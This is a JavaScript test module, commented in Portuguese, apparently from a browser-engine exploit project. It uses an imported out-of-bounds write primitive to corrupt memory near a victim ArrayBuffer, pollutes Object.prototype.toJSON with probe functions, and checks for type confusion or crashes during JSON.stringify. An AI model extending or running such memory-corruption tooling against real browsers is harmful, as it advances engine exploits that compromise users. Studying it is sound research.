// js/script3/testVictimABInstability.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Usado para checar se 'this' é o oob_array_buffer_real
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

// --- Variantes da toJSON para sondar victim_ab (ArrayBuffer) ---

// V1: Operações básicas em ArrayBuffer (byteLength, DataView R/W)
export function toJSON_AB_Probe_V1() {
    const FNAME_toJSON = "toJSON_AB_Probe_V1";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: Object.prototype.toString.call(this),
        is_array_buffer_instance_entry: this instanceof ArrayBuffer,
        byteLength_prop: "N/A",
        is_dataview_created: false,
        dv_write_val: 0xBADDBADD,
        dv_read_val: "N/A",
        dv_rw_match: false,
        error: null
    };
    // Removido logS3 daqui para reduzir verbosidade se chamado muitas vezes
    try {
        if (!result.is_array_buffer_instance_entry) {
            result.error = "this is not an ArrayBuffer instance at entry";
            // logS3(`[${FNAME_toJSON}] ERRO: ${result.error}`, "critical", FNAME_toJSON); // Log verboso
            return result;
        }

        result.byteLength_prop = this.byteLength;

        if (typeof result.byteLength_prop === 'number' && result.byteLength_prop >= 4) {
            const dv = new DataView(this);
            result.is_dataview_created = true;
            dv.setUint32(0, result.dv_write_val, true);
            result.dv_read_val = dv.getUint32(0, true);
            if (result.dv_read_val === result.dv_write_val) {
                result.dv_rw_match = true;
            }
        }
    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
        // logS3(`[${FNAME_toJSON}] EXCEÇÃO: ${result.error}`, "critical", FNAME_toJSON); // Log verboso
    }
    return result;
}

// V2: Mais detalhada, inclui loop for...in para observar mudanças de tipo durante a enumeração
export function toJSON_AB_Probe_V2_Detailed() {
    const FNAME_toJSON = "toJSON_AB_Probe_V2_Detailed";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: Object.prototype.toString.call(this),
        is_array_buffer_instance_entry: this instanceof ArrayBuffer,
        byteLength_prop: "N/A",
        is_dataview_created: false,
        dv_rw_match: false,
        error: null,
        this_type_in_loop: "N/A",
        this_type_after_loop: "N/A",
        for_in_iterations: 0,
        loop_error: null,
    };
    // Removido logS3 daqui para reduzir verbosidade

    try {
        if (!result.is_array_buffer_instance_entry) {
            result.error = "this is not an ArrayBuffer instance at entry";
            return result;
        }
        result.byteLength_prop = this.byteLength;

        if (typeof result.byteLength_prop === 'number' && result.byteLength_prop >= 4) {
            const dv = new DataView(this);
            result.is_dataview_created = true;
            dv.setUint32(0, 0xFEEDFACE, true);
            if (dv.getUint32(0, true) === 0xFEEDFACE) result.dv_rw_match = true;
        }

        try {
            for (const prop in this) {
                if (result.for_in_iterations === 0) {
                    result.this_type_in_loop = Object.prototype.toString.call(this);
                }
                result.for_in_iterations++;
                if (result.for_in_iterations > 100) {
                     break;
                }
            }
        } catch (loop_e) {
            result.loop_error = `${loop_e.name}: ${loop_e.message}`;
        }
        result.this_type_after_loop = Object.prototype.toString.call(this);

    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
    }
    return result;
}


// --- Função de sub-teste ---
export async function executeVictimABInstabilityTest(victim_ab, corruption_offset_in_oob_ab, value_to_write, victim_ab_size_val, toJSONFunctionName, toJSONFunctionToUse) {
    const FNAME_TEST = "executeVictimABInstabilityTest";
    logS3(`--- Sub-Teste de Instabilidade em ArrayBuffer ---`, "subtest", FNAME_TEST);
    logS3(`  Alvo: victim_ab (tamanho esperado: ${victim_ab_size_val})`, "info", FNAME_TEST);
    logS3(`  Corrupção: Escrever ${toHex(value_to_write)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]`, "info", FNAME_TEST);
    logS3(`  Sonda JSON: ${toJSONFunctionName}`, "info", FNAME_TEST);

    let result = { // Objeto para retornar os resultados do teste
        stringifyError: null,
        toJSONReturn: null,
        corruption_offset: corruption_offset_in_oob_ab,
        value_written: value_to_write,
        probe_function: toJSONFunctionName,
        final_verdict_is_problem: false // Adicionado para análise externa
    };

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    const ppKey_val = "toJSON";

    try {
        if (!triggerOOB_primitive()) {
            logS3("Falha ao inicializar ambiente OOB. Abortando sub-teste.", "critical", FNAME_TEST);
            result.stringifyError = { name: "OOBSetupError", message: "triggerOOB_primitive failed" };
            return result;
        }
        if (!oob_write_absolute(corruption_offset_in_oob_ab, value_to_write, 4)) {
            logS3("Falha ao escrever valor de corrupção. Abortando sub-teste.", "error", FNAME_TEST);
            result.stringifyError = { name: "OOBWriteError", message: "oob_write_absolute failed" };
            return result;
        }
        logS3("   Valor de corrupção escrito com sucesso.", "good", FNAME_TEST);
        await PAUSE_S3(SHORT_PAUSE_S3);

        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true,
            enumerable: false,
            configurable: true
        });
        pollutionApplied = true;
        logS3(`   Object.prototype.toJSON poluído com ${toJSONFunctionName}.`, "info", FNAME_TEST);

        logS3("   Chamando JSON.stringify(victim_ab)...", "info", FNAME_TEST);
        try {
            const stringify_output = JSON.stringify(victim_ab);
            // Tentativa de parse, mas o retorno de toJSON pode não ser JSON válido, então trate o erro
            try {
                result.toJSONReturn = JSON.parse(stringify_output);
            } catch (parse_error) {
                 // Se não for JSON válido, use o output direto (que é o retorno da nossa toJSON)
                result.toJSONReturn = stringify_output;
            }
            logS3(`   JSON.stringify invocou toJSON. Retorno da toJSON: ${typeof result.toJSONReturn === 'object' ? JSON.stringify(result.toJSONReturn) : result.toJSONReturn}`, "info", FNAME_TEST);
        } catch (e_str) {
            result.stringifyError = { name: e_str.name, message: e_str.message, stack: e_str.stack };
            logS3(`   !!!! ERRO AO STRINGIFY victim_ab !!!!: ${e_str.name} - ${e_str.message}`, "error", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error");
        }

    } catch (e_main_test_logic) {
        logS3(`Erro na lógica principal do sub-teste: ${e_main_test_logic.message}`, "error", FNAME_TEST);
        if (!result.stringifyError) result.stringifyError = { name: "MainTestLogicError", message: e_main_test_logic.message };
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    // Análise do resultado
    if (result.toJSONReturn && typeof result.toJSONReturn === 'object' && result.toJSONReturn !== null) { // Checa se toJSONReturn é um objeto e não nulo
        const tr = result.toJSONReturn; // alias para toJSONReturn
        if (tr.error || tr.loop_error) {
            result.final_verdict_is_problem = true;
        } else if (tr.toJSON_variant === "toJSON_AB_Probe_V1" &&
                   (!tr.is_array_buffer_instance_entry || tr.byteLength_prop !== victim_ab_size_val || !tr.dv_rw_match)) {
            result.final_verdict_is_problem = true;
        } else if (tr.toJSON_variant === "toJSON_AB_Probe_V2_Detailed" &&
                   ((tr.this_type_in_loop !== "[object ArrayBuffer]" && tr.this_type_in_loop !== "N/A" && tr.for_in_iterations > 0) ||
                   (tr.this_type_after_loop !== "[object ArrayBuffer]"))) {
            result.final_verdict_is_problem = true;
        }
    }


    if (result.stringifyError && result.stringifyError.name === 'RangeError') {
        logS3(`   ---> RangeError: Maximum call stack size exceeded OCORREU com ${toJSONFunctionName} para victim_ab!`, "vuln", FNAME_TEST);
        document.title = `RangeError with ${toJSONFunctionName} on victim_ab!`;
    } else if (result.final_verdict_is_problem) {
        logS3(`   PROBLEMA DETECTADO com ${toJSONFunctionName} para victim_ab. Verifique logs internos da toJSON.`, "error", FNAME_TEST);
        if (result.toJSONReturn && typeof result.toJSONReturn === 'object') {
             const tr = result.toJSONReturn;
             logS3(`      Detalhes do toJSONReturn: is_instance_entry: ${tr.is_array_buffer_instance_entry}, byteLength: ${tr.byteLength_prop}, dv_match: ${tr.dv_rw_match}, type_in_loop: ${tr.this_type_in_loop}, type_after_loop: ${tr.this_type_after_loop}`, "error")
        }
    } else {
        logS3(`   ${toJSONFunctionName} para victim_ab completou sem problemas óbvios detectados.`, "good", FNAME_TEST);
    }

    logS3(`--- Sub-Teste de Instabilidade em ArrayBuffer CONCLUÍDO ---`, "subtest", FNAME_TEST);
    return result;
}

// --- Função principal de teste PARA ESTE MÓDULO ---
export async function runAllInstabilityTestsOnVictimAB() {
    const FNAME_RUNNER = "runAllInstabilityTestsOnVictimAB";
    logS3(`==== INICIANDO Teste Completo de Instabilidade em ArrayBuffer Vítima ====`, "test", FNAME_RUNNER);

    const victim_ab_size = 64;
    let victim_ab = null;

    const corruption_params_to_try = [
        { name: "Offset -16, Val 0xFFFFFFFF", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0xFFFFFFFF },
        { name: "Offset -16, Val 0x00000000", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0x00000000 },
        { name: "Offset -16, Val 0x12345678", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0x12345678 },
        { name: "Offset +0 (Base DV), Val 0xFFFFFFFF", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128), value: 0xFFFFFFFF },
    ];

    const toJSON_Probes = [
        { name: "toJSON_AB_Probe_V1", func: toJSON_AB_Probe_V1 },
        { name: "toJSON_AB_Probe_V2_Detailed", func: toJSON_AB_Probe_V2_Detailed },
    ];

    for (const params of corruption_params_to_try) {
        logS3(`\n[${FNAME_RUNNER}] Testando Parâmetros de Corrupção: ${params.name}`, "test", FNAME_RUNNER);
        victim_ab = new ArrayBuffer(victim_ab_size);
        logS3(`   Novo victim_ab (${victim_ab_size} bytes) criado.`, "info", FNAME_RUNNER);

        for (const probe of toJSON_Probes) {
            await executeVictimABInstabilityTest(
                victim_ab,
                params.offset,
                params.value,
                victim_ab_size,
                probe.name,
                probe.func
            );
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }
        clearOOBEnvironment();
        await PAUSE_S3(SHORT_PAUSE_S3);
    }

    logS3(`==== Teste Completo de Instabilidade em ArrayBuffer Vítima CONCLUÍDO ====`, "test", FNAME_RUNNER);
}
